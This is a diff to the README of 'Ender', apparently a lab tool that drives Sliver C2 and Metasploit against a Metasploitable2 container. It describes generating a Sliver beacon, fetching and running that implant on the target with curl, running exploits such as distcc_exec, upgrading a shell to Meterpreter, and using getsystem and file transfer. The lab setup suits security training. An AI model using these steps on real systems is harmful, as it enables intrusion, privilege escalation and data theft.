@@ -6,27 +6,10 @@ Go to Ender directory
 docker compose up -d --build
 ```
 
-#### Setting Sliver Persistence (FIRST TIME BUILDING)
-In one terminal (Sliver Server):
-```bash
-docker exec -it operator /bin/bash
-cd /opt/sliver 
-sliver-server
-> new-operator --name operator1 --lhost 10.1.1.2
-> multiplayer
-```
-Creates /opt/sliver/operator1_10.1.1.2.cfg
+#### A note on Sliver persistence
+Any Sliver .cfg file you make or Sliver beacon you create will persist throughout sessions.
 
-
-In second terminal (Sliver Client):
-```bash
-docker exec -it operator /bin/bash
-cd /opt/sliver
-sliver-client import operator1_10.1.1.2.cfg
-```
-Saves to /root/.sliver-client/configs/operator1_10.1.1.2.cfg
-
-### From Now On, if you build down and up or start and stop containers, sliver configuration persists (test by running docker compose down and rebuilding before continuing)
+So if you compose up/down or start/stop, your previous .cfg files and beacons will persist.
 
 #### Testing Ender server and metasploit
 
@@ -90,22 +73,21 @@ ping -c 4 10.1.1.3
 nmap -l metasploitable2
 ```
 
-#### Firstly, setting up beacon
+#### Firstly, creating a sliver beacon
 In one terminal (Sliver Server):
 ```bash
-docker exec -it operator /bin/bash 
-root@operator:/workspace/enderCLI# sliver-server
-> multiplayer
+docker exec -it operator /bin/bash
+root@operator:/workspace/enderCLI# python ender_server/server.py
 ```
-***MUST INCLUDE MULTIPLAYER***
 
 In second terminal (Sliver Client):
 ```bash
 docker exec -it operator /bin/bash
-root@operator:/workspace/enderCLI# sliver-client
-> generate beacon --seconds 5 --jitter 0 --http 10.1.1.2 --os linux --arch amd64 --name testbeacon
-> http	
+root@operator:/workspace/enderCLI# python ender_client/client.py
+Enter message (or 'quit' to exit): create_beacon operator1 10.1.1.2 5 0 10.1.1.2 linux amd64 testbeacon (option "shellcode" optional)
 ```
+
+Go back to the first terminal to monitor the Sliver beacon creation and verify that beacon is created
 
 #### Secondly, set up server to transfer implant for exploitation
 In third terminal (operator workspace):
@@ -124,67 +106,94 @@ curl -O http://10.1.1.2:8080/testbeacon && chmod +x testbeacon && sudo service a
 
 Check the sliver-client terminal to see the beacon connection.
 
-#### Lastly, run main.py for simultaneous Metasploit and Sliver behavior
-In the third terminal with the http server, ctrl-c once the GET request is made and run the following in workspace#:
+#### Stop Python Server in Third Terminal
+In the third terminal with the http server, ctrl-c once the GET request is made
+
+#### Get the Sliver Beacon ID
+In the Ender client, get the Sliver Beacon ID
+```bash
+Enter message (or 'quit' to exit): get-sliver-beacons
+```
+
+#### Use the Sliver Beacon ID to Hand it off to Metasploit
+Using the most recent Beacon ID, hand off the beacon to Metasploit
+```bash
+Enter message (or 'quit' to exit): sliver {beacon_id} handoff_to_metasploit
+```
+Monitor the handoff in the Sliver server to verify that the handoff is successful
+
+#### Optional, run main.py for simultaneous Metasploit and Sliver behavior
+Run the following in workspace#:
 ```bash 
 python src/main.py
 ```
 # Using Meterpreter
 Once a successful exploit has been executed, you can use Meterpreter to interact with the compromised machine.
 ### Example
+Connect to the Metasploit RPC server:
 ```bash
-search exploits eternalblue
-search auxiliary ssh
-run exploit windows/smb/ms17_010_eternalblue
+connect
+(Optional) Search for modules:
+search exploits <keyword>
+search auxiliary <keyword>
 ```
-
-## 1. Check active sessions
+## 1. Execute an Exploit
+Run an exploit module; you will be prompted for any required options
+```bash
+run exploit unix/misc/distcc_exec
+```
+## 2. Check active sessions
 To see active Meterpreter sessions:
 ```bash
 sessions
 ```
-This will list available sessions with their session ID.
+Output will include:
 
-## 2. Interact with a session
-Replace <session_id> with an actual session ID from the list:
-```bash
-meterpreter <session_id> sysinfo
-```
+    Session ID
+    Type (shell/meterpreter)
+    Host and Port
+    Via (module that created the session)
 
-## 3. Run common Meterpreter commands
-Once inside a session, you can run various commands:
+run post multi/manage/shell_to_meterpreter SESSION=1 LHOST=10.1.1.2 LPORT=5555
 
-System Information:
-```bash
-meterpreter <session_id> sysinfo
+## 3. Upgrade to a Meterpreter Shell
+
+If you have only a plain shell, upgrade it to Meterpreter for richer functionality:
+
+    run post multi/manage/shell_to_meterpreter SESSION=<id> LHOST=<your_ip> LPORT=<listener_port>
+
+Example:
+
+    run post multi/manage/shell_to_meterpreter SESSION=1 LHOST=10.1.1.2 LPORT=5555
+
+## 4. Interact with a Meterpreter Session
+
+Replace <session_id> with the actual ID from sessions:
+
+### a. Basic commands
 ```
-List Processes:
-```bash 
-meterpreter <session_id> ps
-```
-Get System Privileges:
-```bash
-meterpreter <session_id> getsystem
-```
-Upload a file:
-```bash
-meterpreter <session_id> upload /path/to/local/file /path/to/remote/file
-```
-Download a file
-```bash
-meterpreter <session_id> download /path/to/remote/file /path/to/local/file
-```
-Run a Shell
-```bash
-meterpreter <session_id> shell
-```
-## Exit Meterpreter Session
-To exit a Meterpreter session:
-```bash
-meterpreter <session_id> exit
+meterpreter <session_id> sysinfo   # System information
+meterpreter <session_id> ps        # List processes
+meterpreter <session_id> getsystem # Attempt privilege escalation
 ```
 
-#### Clean Up
+### b. File operations
+```
+meterpreter <session_id> upload /local/path /remote/path   # Upload file
+meterpreter <session_id> download /remote/path /local/path # Download file
+```
+
+### c. Interactive shell
+```
+meterpreter <session_id> shell   # Drop into a command shell
+```
+
+### d. Exit session
+```
+meterpreter <session_id> exit    # Close the Meterpreter session
+```
+
+## 5. Clean Up
 To stop all running containers
 ```console
 docker compose stop
